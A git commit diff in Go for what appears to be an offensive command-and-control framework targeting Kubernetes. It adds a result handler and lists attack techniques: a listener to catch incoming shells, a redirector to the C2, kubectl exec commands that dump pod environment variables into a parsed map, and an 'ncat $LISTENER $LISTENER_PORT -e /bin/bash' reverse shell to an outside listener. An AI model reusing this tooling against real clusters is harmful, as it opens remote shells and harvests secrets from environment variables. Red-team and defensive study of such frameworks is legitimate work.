9255f62c70dc449a106b660fa4b5848cd1961d5b
Markus Gierlinger <mataryki@gmail.com>
2024-10-06 21:39:01 +0200

    add generic TTP exec and  result handler

--- src/armory/armory.go
+++ src/armory/armory.go
@@ -11,6 +11,7 @@ type ResultHandler = func(source domain.Entity, args ...any) (domain.Event, erro
 
 type TTPMeta struct {
 	Title, Description string
+	ResultHandler      ResultHandler
 }
 
 func (meta TTPMeta) GetTitle() string {
@@ -18,6 +19,13 @@ func (meta TTPMeta) GetTitle() string {
 }
 func (meta TTPMeta) GetDescription() string {
 	return meta.Description
+}
+
+func (meta TTPMeta) HandleResult(source domain.Entity, args ...any) (domain.Event, error) {
+	if meta.ResultHandler == nil {
+		return nil, nil
+	}
+	return meta.ResultHandler(source, args...)
 }
 
 type CreateListener struct {
@@ -61,21 +69,73 @@ type KubectlExecCmd struct {
 }
 
 func (c KubectlExecCmd) GetMessage() domain.Message {
-	return &domain.ExecCmd{Cmd: c.Cmd, Target: &domain.Target{}}
+	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
 }
 
 type Armory struct {
 }
 
-func (a Armory) GetTTPs() []TTP {
-	return []TTP{
-		CreateListener{TTPMeta: TTPMeta{Title: "Create Listener", Description: "Catch incoming shells"}, Port: 1337},
-		CreateRedirector{TTPMeta: TTPMeta{Title: "Create Redirector", Description: "Create a proxy routing traffic to the C2"}, DstPort: 1337},
-		ReadEnvVars{TTPMeta: TTPMeta{Title: "Read Environment Variables", Description: "Read environment variables from a target"}},
-		KubectlExecCmd{TTPMeta: TTPMeta{Title: "Kubectl Exec simple shell", Description: "Use kubectl exec to establish a simple shell"}, Cmd: "ncat $LISTENER $LISTENER_PORT -e /bin/bash"},
+func (a Armory) GetTTPs() []domain.TTP {
+	return []domain.TTP{
+		CreateListener{
+			TTPMeta: TTPMeta{
+				Title: "Create Listener", Description: "Catch incoming shells",
+			},
+			Port: 1337,
+		},
+		CreateRedirector{
+			TTPMeta: TTPMeta{
+				Title:       "Create Redirector",
+				Description: "Create a proxy routing traffic to the C2",
+			},
+			DstPort: 1337,
+		},
+		ReadEnvVars{
+			TTPMeta: TTPMeta{
+				Title:         "Read Environment Variables",
+				Description:   "Read environment variables from a target",
+				ResultHandler: handleEnvVarResult,
+			},
+		},
+		KubectlExecCmd{
+			TTPMeta: TTPMeta{
+				Title:         "Kubectl Exec Env",
+				Description:   "Use kubectl exec to read environment variables of a pod",
+				ResultHandler: handleEnvVarResult,
+			},
+			Cmd: "env",
+		},
+		KubectlExecCmd{
+			TTPMeta: TTPMeta{
+				Title:       "Kubectl Exec simple shell",
+				Description: "Use kubectl exec to establish a simple shell",
+			},
+			Cmd: "ncat $LISTENER $LISTENER_PORT -e /bin/bash",
+		},
 	}
 }
 
 func LoadArmory() (Armory, error) {
 	return Armory{}, nil
+}
+
+func handleEnvVarResult(source domain.Entity, args ...any) (domain.Event, error) {
+	stderr := args[1].(string)
+	if stderr != "" {
+		return nil, errors.New(stderr)
+	}
+
+	stdout := args[0].(string)
+	vars := make(map[string]string)
+	for _, l := range strings.Split(stdout, "\n") {
+		k, v, ok := strings.Cut(l, "=")
+		if ok {
+			vars[k] = v
+		}
+	}
+
+	return domain.EnvVarsExtracted{
+		Source: source,
+		Vars:   vars,
+	}, nil
 }
